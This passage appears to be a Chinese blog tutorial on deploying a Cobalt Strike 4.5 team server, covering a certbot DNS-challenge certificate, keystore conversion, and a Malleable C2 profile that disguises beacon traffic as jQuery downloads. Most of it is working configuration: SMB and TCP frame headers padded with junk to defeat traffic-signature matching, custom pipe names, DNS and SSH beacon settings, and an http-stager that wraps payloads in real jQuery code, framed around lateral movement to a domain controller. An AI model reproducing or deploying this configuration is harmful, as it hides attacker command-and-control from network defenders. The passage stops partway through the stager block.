+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/opt/CS<span class="comment"># certbot -d ****.today --manual --preferred-challenges dns certonly</span></span><br><span class="line">Saving debug <span class="built_in">log</span> to /var/log/letsencrypt/letsencrypt.log</span><br><span class="line">Enter email address (used <span class="keyword">for</span> urgent renewal and security notices)</span><br><span class="line"> (Enter <span class="string">&#x27;c&#x27;</span> to cancel): <span class="built_in">test</span>@admin.com</span><br><span class="line"></span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line">Please <span class="built_in">read</span> the Terms of Service at</span><br><span class="line">https://letsencrypt.org/documents/LE-SA-v1.4-April-3-2024.pdf. You must agree <span class="keyword">in</span></span><br><span class="line">order to register with the ACME server. Do you agree?</span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line">(Y)es/(N)o: Y</span><br><span class="line"></span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line">Would you be willing, once your first certificate is successfully issued, to</span><br><span class="line">share your email address with the Electronic Frontier Foundation, a founding</span><br><span class="line">partner of the Let<span class="string">&#x27;s Encrypt project and the non-profit organization that</span></span><br><span class="line"><span class="string">develops Certbot? We&#x27;</span>d like to send you email about our work encrypting the web,</span><br><span class="line">EFF news, campaigns, and ways to support digital freedom.</span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line">(Y)es/(N)o: Y</span><br><span class="line">Account registered.</span><br><span class="line">Requesting a certificate <span class="keyword">for</span> ******.today</span><br><span class="line"></span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line">Please deploy a DNS TXT record under the name:</span><br><span class="line"></span><br><span class="line">_acme-challenge.****.today.</span><br><span class="line"></span><br><span class="line">with the following value:</span><br><span class="line"></span><br><span class="line">3aDdvZOMSeocA**********JoETHEQQFqw</span><br><span class="line"></span><br><span class="line">Before continuing, verify the TXT record has been deployed. Depending on the DNS</span><br><span class="line">provider, this may take some time, from a few seconds to multiple minutes. You can</span><br><span class="line">check <span class="keyword">if</span> it has finished deploying with aid of online tools, such as the Google</span><br><span class="line">Admin Toolbox: https://toolbox.googleapps.com/apps/dig/<span class="comment">#TXT/_acme-challenge.******.today.</span></span><br><span class="line">Look <span class="keyword">for</span> one or more bolded line(s) below the line <span class="string">&#x27;;ANSWER&#x27;</span>. It should show the</span><br><span class="line">value(s) you<span class="string">&#x27;ve just added.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span></span><br><span class="line"><span class="string">Press Enter to Continue</span></span><br></pre></td></tr></table></figure>
+
+<p>按照上边的提示添加一个name为<code>_acme-challenge.****.today</code>, value为<code>3aDdvZOMSeocA**********JoETHEQQFqw</code>的TXT解析记录,保存之后稍等一会儿再按回车,DNS解析需要点时间,大概需要一分钟就能生效.</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251726470.png" data-fancybox="true"/></div></div>
+
+<p>回车之后,稍等片刻,如果申请成功会看到以下信息.</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251726920.png" data-fancybox="true"/></div></div>
+
+<h4 id="转换"><a href="#转换" class="headerlink" title="转换"></a>转换</h4><p>pem、crt格式的证书需进行转换,先加一下密码.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -<span class="keyword">in</span> privkey.pem -aes256 -out privkey_with_password.pem</span><br><span class="line"><span class="comment"># 转换为p12格式</span></span><br><span class="line">openssl pkcs12 -<span class="built_in">export</span> -out mycert.p12 -inkey privkey_with_password.pem -<span class="keyword">in</span> fullchain.pem -passout pass:YourP12Password</span><br><span class="line"></span><br><span class="line"><span class="comment"># -export: 指示 openssl 导出到 P12 文件,</span></span><br><span class="line"><span class="comment"># -out mycert.p12: 指定输出的 P12 文件名,</span></span><br><span class="line"><span class="comment"># -inkey privkey_with_password.pem: 指定包含密码的私钥文件,</span></span><br><span class="line"><span class="comment"># -in /etc/letsencrypt/live/yourdomain.com/fullchain.pem: 指定包含证书链的文件,</span></span><br><span class="line"><span class="comment"># -passout pass:YourP12Password: 用于设置 P12 文件的密码,请将 YourP12Password 替换为你希望使用的密码,</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">mv</span> mycert.p12 /opt/CS/coablt_strike_4.5_jx/mycert.store</span><br></pre></td></tr></table></figure>
+
+<p>crt格式—&gt;store</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -import -trustcacerts -<span class="built_in">alias</span> mykey -file domain.crt -keystore domain.store</span><br></pre></td></tr></table></figure>
+
+<p>然后在<code>teamserver</code>及<code>profile</code>对应位置修改证书路径及密码</p>
+<h3 id="配置Profile"><a href="#配置Profile" class="headerlink" title="配置Profile"></a>配置Profile</h3><p>cs中默认是没有<code>profile</code>文件的 , 需要自己配置 , 而且官网称<code>profile</code>文件为<code>Malleablec2</code>,整个<code>profile</code>文件的配置就是进行流量上的伪装, 把命令的下发和结果的回传进行包装 , 让他从流量上看起来更像是在访问网页.</p>
+<h4 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置全局变量sample_name , 值是当前文件名</span></span><br><span class="line"><span class="built_in">set</span> sample_name <span class="string">&quot;jQuery CS 4.5 Profile&quot;</span>;</span><br><span class="line"><span class="comment"># 设置心跳包的时间 , 单位毫秒</span></span><br><span class="line"><span class="built_in">set</span> sleeptime <span class="string">&quot;1000&quot;</span>; </span><br><span class="line"><span class="comment"># set sleeptime &quot;&lt;60000&gt;&quot;; # 1 Minute , 默认的</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> jitter <span class="string">&quot;50&quot;</span>; <span class="comment"># 设置心跳包时间的波动范围 45 +- 45*37% </span></span><br><span class="line"><span class="built_in">set</span> data_jitter <span class="string">&quot;100&quot;</span>; <span class="comment"># 意味着每次HTTP服务器响应时,都会附加一个长度在0到100个字符之间的随机字符串,这样做的目的是为了增加服务器响应的大小的不可预测性,使得Cobalt Strike的通信模式更难以通过网络监控工具被识别和分析.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置全局的UA头</span></span><br><span class="line"><span class="built_in">set</span> useragent <span class="string">&quot;Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<h4 id="SSL证书设置"><a href="#SSL证书设置" class="headerlink" title="SSL证书设置"></a>SSL证书设置</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">https-certificate &#123;</span><br><span class="line">    <span class="built_in">set</span> C   <span class="string">&quot;US&quot;</span>;    <span class="comment">#国家</span></span><br><span class="line">    <span class="built_in">set</span> CN  <span class="string">&quot;jquery.com&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> O   <span class="string">&quot;jQuery&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> OU  <span class="string">&quot;Certificate Authority&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> validity <span class="string">&quot;365&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">set</span> keystore <span class="string">&quot;cobaltstrike.store&quot;</span>; <span class="comment"># 证书文件</span></span><br><span class="line">    <span class="built_in">set</span> password <span class="string">&quot;1qazwsx&quot;</span>;  <span class="comment"># 证书密码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h4><div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409260834819.png" data-fancybox="true"/></div></div>
+
+<p>在通过 CS 进行内网渗透的过程中,出网的OA系统与我们的TeamServer服务器建立了<code>HTTP Beacon</code>进程,而域控系统不出网它与OA系统建立<code>SMB Beacon</code>的进程,这两个进程之间进行通信就涉及到了一个概念:<strong>命名管道</strong></p>
+<p>那么我们可以自定义修改什么东西呢?首先了解一下 SMB 头的结构:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># SMB Beacon </span></span><br><span class="line"><span class="comment"># SMB [长度][数据]</span></span><br><span class="line"><span class="built_in">set</span> smb_frame_header <span class="string">&quot;\x80&quot;</span>;</span><br><span class="line"><span class="built_in">set</span> pipename         <span class="string">&quot;pmns.8507.1179.793340931646472486##&quot;</span>; <span class="comment"># smb管道的名字</span></span><br><span class="line"><span class="built_in">set</span> pipename_stager  <span class="string">&quot;pmns.8507.1179.793340931646472486##&quot;</span>;  <span class="comment"># smb stager管道的名字</span></span><br></pre></td></tr></table></figure>
+
+<p>而有一些流量监测设备它会先取到 SMB 的长度值,然后根据长度向后进行匹配数据内容,并将匹配的数据内容与特征库中记录进行对比,如果匹配上了就会被识别出是一个<code>SMB Beacon</code>的进程,然后就会被查杀.</p>
+<p>对抗方法:<code>set smb_frame_header=&quot;McZqJerrcYXxBoQNxrepOqPQ \x80&quot;;</code>我们在前面加上一些垃圾字符,使其无法正常匹配到关键信息.在 CS 里<code>SMB Beacon</code>还会有一个管道名(<code>pipename</code>),而它的值还是默认的,这部分值也有可能会被提取出来加入特征库,所以我们在使用的过程中必须对<code>pipename</code>进行一个自定义.<code>set pipename &quot;McZqJerrcYXxBoQNxrepOqPQ-#####&quot;;</code></p>
+<p><strong>pipename和pipename_stager字符串不要一样</strong></p>
+<blockquote>
+<p><code>pipename_stager</code>:CS 提供一个功能:<code>jump-&gt;psexec</code>使用的就是 SMB 协议,当我们的OA系统与域控系统连接时就是建立的<code>SMB Beacon</code>进程,建立这样的一个进程会在域控系统上上传某个文件并运行,但是如果这样的文件大小太大,就容易被流量设备检测到并中断,所以这里就应用了一种思想“小马拉大马”,通过上传一个小文件再利用这个小文件上传大文件.这就是<code>pipename_stager</code>.</p>
+</blockquote>
+<h4 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h4><div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409260834924.png" data-fancybox="true"/></div></div>
+
+<p>因为现在在内网中SMB的查杀非常严格,所以在我们自定义不好的情况下,可以考虑TCP 建立这样的连接,也就是我们的承载协议变成了 TCP.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># TCP Beacon监听端口</span></span><br><span class="line"><span class="comment"># 同样是增加混淆的字符进行绕过</span></span><br><span class="line"><span class="built_in">set</span> tcp_frame_header <span class="string">&quot;McZqJerrcYXxBoQNxrepOqPQ \x80&quot;</span>;</span><br><span class="line"><span class="built_in">set</span> tcp_port <span class="string">&quot;42585&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<h4 id="DNS-Beacon"><a href="#DNS-Beacon" class="headerlink" title="DNS-Beacon"></a>DNS-Beacon</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">dns-beacon &#123;</span><br><span class="line">    <span class="built_in">set</span> dns_idle           <span class="string">&quot;114.114.114.114&quot;</span>; <span class="comment"># 第一次dns查询的地址</span></span><br><span class="line">    <span class="built_in">set</span> dns_max_txt        <span class="string">&quot;252&quot;</span>; <span class="comment"># 最大查询次数 , 255以下 , 能被4整除</span></span><br><span class="line">    <span class="built_in">set</span> dns_sleep          <span class="string">&quot;0&quot;</span>;   <span class="comment"># sleep时间</span></span><br><span class="line">    <span class="built_in">set</span> dns_ttl            <span class="string">&quot;5&quot;</span>;   <span class="comment"># tll值</span></span><br><span class="line">    <span class="built_in">set</span> maxdns             <span class="string">&quot;255&quot;</span>; <span class="comment"># 最大dns服务转接数量</span></span><br><span class="line">    <span class="built_in">set</span> dns_stager_prepend <span class="string">&quot;.resources.123456.&quot;</span>; <span class="comment"># 使用dns协议的马,pe头追加的内容</span></span><br><span class="line">    <span class="built_in">set</span> dns_stager_subhost <span class="string">&quot;.feeds.123456.&quot;</span>;     <span class="comment"># 子域名的查询配置</span></span><br><span class="line">    <span class="comment"># DNS subhosts override options, added in version 4.3</span></span><br><span class="line">    <span class="built_in">set</span> beacon           <span class="string">&quot;a.bc.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> get_A            <span class="string">&quot;b.1a.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> get_AAAA         <span class="string">&quot;c.4a.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> get_TXT          <span class="string">&quot;d.tx.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> put_metadata     <span class="string">&quot;e.md.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> put_output       <span class="string">&quot;f.po.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> ns_response      <span class="string">&quot;zero&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="SSH-Beacon"><a href="#SSH-Beacon" class="headerlink" title="SSH-Beacon"></a>SSH-Beacon</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> ssh_banner        <span class="string">&quot;OpenSSH_7.4 Debian (protocol 2.0)&quot;</span>;  <span class="comment"># SSH连接的banner信息</span></span><br><span class="line"><span class="built_in">set</span> ssh_pipename      <span class="string">&quot;miuJRfvN##&quot;</span>; <span class="comment"># 定义了用于SSH伪Beacon通信的命名管道的名称前缀,##是一个占位符</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Http-Stager"><a href="#Http-Stager" class="headerlink" title="Http-Stager"></a>Http-Stager</h4><blockquote>
+<p>Http-Stager块是用来自定义HTTP阶段化(staging)过程的配置,阶段化是Cobalt Strike中的一个重要概念,它指的是将第二阶段的有效载荷(即用于后渗透测试的代码)传输到已经受到攻击者控制的主机上的过程.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  用于指定是否启用通过HTTP、HTTPS或DNS进行阶段化(第二阶段)的有效载荷(payload)托管,</span></span><br><span class="line"><span class="built_in">set</span> host_stage <span class="string">&quot;true&quot;</span>; <span class="comment"># Host payload for staging over HTTP, HTTPS, or DNS. Required by stagers.set</span></span><br><span class="line">http-stager &#123;  </span><br><span class="line">    <span class="built_in">set</span> uri_x86 <span class="string">&quot;/jquery-3.3.1.slim.min.js&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> uri_x64 <span class="string">&quot;/jquery-3.3.2.slim.min.js&quot;</span>;</span><br><span class="line">    server &#123;</span><br><span class="line">        header <span class="string">&quot;Server&quot;</span> <span class="string">&quot;NetDNA-cache/2.2&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Cache-Control&quot;</span> <span class="string">&quot;max-age=0, no-cache&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Pragma&quot;</span> <span class="string">&quot;no-cache&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;keep-alive&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/javascript; charset=utf-8&quot;</span>;</span><br><span class="line">        output &#123;</span><br><span class="line">            <span class="comment">## The javascript was changed.  Double quotes and backslashes were escaped to properly render (Refer to Tips for Profile Parameter Values)</span></span><br><span class="line">            <span class="comment"># 2nd Line            </span></span><br><span class="line">            prepend <span class="string">&quot;!function(e,t)&#123;\&quot;use strict\&quot;;\&quot;object\&quot;==typeof module&amp;&amp;\&quot;object\&quot;==typeof module.exports?module.exports=e.document?t(e,!0):function(e)&#123;if(!e.document)throw new Error(\&quot;jQuery requires a window with a document\&quot;);return t(e)&#125;:t(e)&#125;(\&quot;undefined\&quot;!=typeof window?window:this,function(e,t)&#123;\&quot;use strict\&quot;;var n=[],r=e.document,i=Object.getPrototypeOf,o=n.slice,a=n.concat,s=n.push,u=n.indexOf,l=&#123;&#125;,c=l.toString,f=l.hasOwnProperty,p=f.toString,d=p.call(Object),h=&#123;&#125;,g=function e(t)&#123;return\&quot;function\&quot;==typeof t&amp;&amp;\&quot;number\&quot;!=typeof t.nodeType&#125;,y=function e(t)&#123;return null!=t&amp;&amp;t===t.window&#125;,v=&#123;type:!0,src:!0,noModule:!0&#125;;function m(e,t,n)&#123;var i,o=(t=t||r).createElement(\&quot;script\&quot;);if(o.text=e,n)for(i in v)n[i]&amp;&amp;(o[i]=n[i]);t.head.appendChild(o).parentNode.removeChild(o)&#125;function x(e)&#123;return null==e?e+\&quot;\&quot;:\&quot;object\&quot;==typeof e||\&quot;function\&quot;==typeof e?l[c.call(e)]||\&quot;object\&quot;:typeof e&#125;var b=\&quot;3.3.1\&quot;,w=function(e,t)&#123;return new w.fn.init(e,t)&#125;,T=/^[\\s\\uFEFF\\xA0]+|[\\s\\uFEFF\\xA0]+$/g;w.fn=w.prototype=&#123;jquery:\&quot;3.3.1\&quot;,constructor:w,length:0,toArray:function()&#123;return o.call(this)&#125;,get:function(e)&#123;return null==e?o.call(this):e&lt;0?this[e+this.length]:this[e]&#125;,pushStack:function(e)&#123;var t=w.merge(this.constructor(),e);return t.prevObject=this,t&#125;,each:function(e)&#123;return w.each(this,e)&#125;,map:function(e)&#123;return this.pushStack(w.map(this,function(t,n)&#123;return e.call(t,n,t)&#125;))&#125;,slice:function()&#123;return this.pushStack(o.apply(this,arguments))&#125;,first:function()&#123;return this.eq(0)&#125;,last:function()&#123;return this.eq(-1)&#125;,eq:function(e)&#123;var t=this.length,n=+e+(e&lt;0?t:0);return this.pushStack(n&gt;=0&amp;&amp;n&lt;t?[this[n]]:[])&#125;,end:function()&#123;return this.prevObject||this.constructor()&#125;,push:s,sort:n.sort,splice:n.splice&#125;,w.extend=w.fn.extend=function()&#123;var e,t,n,r,i,o,a=arguments[0]||&#123;&#125;,s=1,u=arguments.length,l=!1;for(\&quot;boolean\&quot;==typeof a&amp;&amp;(l=a,a=arguments[s]||&#123;&#125;,s++),\&quot;object\&quot;==typeof a||g(a)||(a=&#123;&#125;),s===u&amp;&amp;(a=this,s--);s&lt;u;s++)if(null!=(e=arguments[s]))for(t in e)n=a[t],a!==(r=e[t])&amp;&amp;(l&amp;&amp;r&amp;&amp;(w.isPlainObject(r)||(i=Array.isArray(r)))?(i?(i=!1,o=n&amp;&amp;Array.isArray(n)?n:[]):o=n&amp;&amp;w.isPlainObject(n)?n:&#123;&#125;,a[t]=w.extend(l,o,r)):void 0!==r&amp;&amp;(a[t]=r));return a&#125;,w.extend(&#123;expando:\&quot;jQuery\&quot;+(\&quot;3.3.1\&quot;+Math.random()).replace(/\\D/g,\&quot;\&quot;),isReady:!0,error:function(e)&#123;throw new Error(e)&#125;,noop:function()&#123;&#125;,isPlainObject:function(e)&#123;var t,n;return!(!e||\&quot;[object Object]\&quot;!==c.call(e))&amp;&amp;(!(t=i(e))||\&quot;function\&quot;==typeof(n=f.call(t,\&quot;constructor\&quot;)&amp;&amp;t.constructor)&amp;&amp;p.call(n)===d)&#125;,isEmptyObject:function(e)&#123;var t;for(t in e)return!1;return!0&#125;,globalEval:function(e)&#123;m(e)&#125;,each:function(e,t)&#123;var n,r=0;if(C(e))&#123;for(n=e.length;r&lt;n;r++)if(!1===t.call(e[r],r,e[r]))break&#125;else for(r in e)if(!1===t.call(e[r],r,e[r]))break;return e&#125;,trim:function(e)&#123;return null==e?\&quot;\&quot;:(e+\&quot;\&quot;).replace(T,\&quot;\&quot;)&#125;,makeArray:function(e,t)&#123;var n=t||[];return null!=e&amp;&amp;(C(Object(e))?w.merge(n,\&quot;string\&quot;==typeof e?[e]:e):s.call(n,e)),n&#125;,inArray:function(e,t,n)&#123;return null==t?-1:u.call(t,e,n)&#125;,merge:function(e,t)&#123;for(var n=+t.length,r=0,i=e.length;r&lt;n;r++)e[i++]=t[r];return e.length=i,e&#125;,grep:function(e,t,n)&#123;for(var r,i=[],o=0,a=e.length,s=!n;o&lt;a;o++)(r=!t(e[o],o))!==s&amp;&amp;i.push(e[o]);return i&#125;,map:function(e,t,n)&#123;var r,i,o=0,s=[];if(C(e))for(r=e.length;o&lt;r;o++)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);else for(o in e)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);return a.apply([],s)&#125;,guid:1,support:h&#125;),\&quot;function\&quot;==typeof Symbol&amp;&amp;(w.fn[Symbol.iterator]=n[Symbol.iterator]),w.each(\&quot;Boolean Number String Function Array Date RegExp Object Error Symbol\&quot;.split(\&quot; \&quot;),function(e,t)&#123;l[\&quot;[object \&quot;+t+\&quot;]\&quot;]=t.toLowerCase()&#125;);function C(e)&#123;var t=!!e&amp;&amp;\&quot;length\&quot;in e&amp;&amp;e.length,n=x(e);return!g(e)&amp;&amp;!y(e)&amp;&amp;(\&quot;array\&quot;===n||0===t||\&quot;number\&quot;==typeof t&amp;&amp;t&gt;0&amp;&amp;t-1 in e)&#125;var E=function(e)&#123;var t,n,r,i,o,a,s,u,l,c,f,p,d,h,g,y,v,m,x,b=\&quot;sizzle\&quot;+1*new Date,w=e.document,T=0,C=0,E=ae(),k=ae(),S=ae(),D=function(e,t)&#123;return e===t&amp;&amp;(f=!0),0&#125;,N=&#123;&#125;.hasOwnProperty,A=[],j=A.pop,q=A.push,L=A.push,H=A.slice,O=function(e,t)&#123;for(var n=0,r=e.length;n&lt;r;n++)if(e[n]===t)return n;return-1&#125;,P=\&quot;\r&quot;</span>;</span><br><span class="line">            <span class="comment"># 1st Line</span></span><br><span class="line">            prepend <span class="string">&quot;/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */&quot;</span>;</span><br><span class="line">            append <span class="string">&quot;\&quot;.(o=t.documentElement,Math.max(t.body[\&quot;scroll\&quot;+e],o[\&quot;scroll\&quot;+e],t.body[\&quot;offset\&quot;+e],o[\&quot;offset\&quot;+e],o[\&quot;client\&quot;+e])):void 0===i?w.css(t,n,s):w.style(t,n,i,s)&#125;,t,a?i:void 0,a)&#125;&#125;)&#125;),w.each(\&quot;blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu\&quot;.split(\&quot; \&quot;),function(e,t)&#123;w.fn[t]=function(e,n)&#123;return arguments.length&gt;0?this.on(t,null,e,n):this.trigger(t)&#125;&#125;),w.fn.extend(&#123;hover:function(e,t)&#123;return this.mouseenter(e).mouseleave(t||e)&#125;&#125;),w.fn.extend(&#123;bind:function(e,t,n)&#123;return this.on(e,null,t,n)&#125;,unbind:function(e,t)&#123;return this.off(e,null,t)&#125;,delegate:function(e,t,n,r)&#123;return this.on(t,e,n,r)&#125;,undelegate:function(e,t,n)&#123;return 1===arguments.length?this.off(e,\&quot;**\&quot;):this.off(t,e||\&quot;**\&quot;,n)&#125;&#125;),w.proxy=function(e,t)&#123;var n,r,i;if(\&quot;string\&quot;==typeof t&amp;&amp;(n=e[t],t=e,e=n),g(e))return r=o.call(arguments,2),i=function()&#123;return e.apply(t||this,r.concat(o.call(arguments)))&#125;,i.guid=e.guid=e.guid||w.guid++,i&#125;,w.holdReady=function(e)&#123;e?w.readyWait++:w.ready(!0)&#125;,w.isArray=Array.isArray,w.parseJSON=JSON.parse,w.nodeName=N,w.isFunction=g,w.isWindow=y,w.camelCase=G,w.type=x,w.now=Date.now,w.isNumeric=function(e)&#123;var t=w.type(e);return(\&quot;number\&quot;===t||\&quot;string\&quot;===t)&amp;&amp;!isNaN(e-parseFloat(e))&#125;,\&quot;function\&quot;==typeof define&amp;&amp;define.amd&amp;&amp;define(\&quot;jquery\&quot;,[],function()&#123;return w&#125;);var Jt=e.jQuery,Kt=e.$;return w.noConflict=function(t)&#123;return e.$===w&amp;&amp;(e.$=Kt),t&amp;&amp;e.jQuery===w&amp;&amp;(e.jQuery=Jt),w&#125;,t||(e.jQuery=e.$=w),w&#125;);&quot;</span>;</span><br><span class="line">            <span class="built_in">print</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    client &#123;</span><br><span class="line">        header <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;text/html,application/xhtml+xml&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Accept-Language&quot;</span> <span class="string">&quot;en-US,en;q=0.5&quot;</span>;</span><br><span class="line">        <span class="comment">#header &quot;Host&quot; &quot;code.jquery.com&quot;;</span></span><br><span class="line">        header <span class="string">&quot;Referer&quot;</span> <span class="string">&quot;http://code.jquery.com/&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Accept-Encoding&quot;</span> <span class="string">&quot;gzip, deflate&quot;</span>;</span><br><span class="line">    &#125;</span><br><span 